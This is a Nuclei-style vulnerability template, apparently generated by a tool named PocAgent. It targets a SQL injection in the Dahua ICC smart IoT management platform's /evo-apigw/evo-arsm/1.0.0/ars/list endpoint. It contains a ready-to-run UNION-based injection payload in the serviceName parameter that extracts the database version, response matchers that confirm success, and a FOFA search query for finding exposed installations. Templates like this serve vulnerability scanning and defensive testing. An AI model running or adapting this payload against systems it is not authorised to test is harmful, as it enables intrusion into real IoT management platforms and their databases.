id: dahua-icc-ars-list-sqli

info:
  name: 大华ICC智能物联管理平台_ars_list_SQL注入漏洞
  author: PocAgent
  severity: critical
  description: |
    大华ICC智能物联管理平台 /evo-apigw/evo-arsm/1.0.0/ars/list 接口存在SQL注入漏洞。
    攻击者可通过 serviceName 参数构造恶意UNION查询，获取数据库信息（如版本、用户、表名等）。
  reference:
    - https://cdn.nlark.com/yuque/0/2026/png/43110909/1767518972544-1c684bce-2539-4dc1-bf49-9791be0214ad.png
  tags: dahua,icc,sqli,sql-injection,iot,intrusive
  metadata:
    verified: true
    fofa-query: body="static/qwebchannel.js" && body="/客户端会小于800/"

http:
  - method: GET
    path:
      - "{{BaseURL}}/evo-apigw/evo-arsm/1.0.0/ars/list?serviceName='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,VERSION(),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36
      Accept: "*/*"
      Connection: keep-alive
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '"success":true'
          - '"serviceIp":"~'
        condition: and
        part: body

      - type: regex
        part: body
        regex:
          - '"serviceIp":"~[0-9]+\.[0-9]+\.[0-9]+[^"]*~"'  # 匹配 ~5.7.44-log~ 格式

    stop-at-first-match: true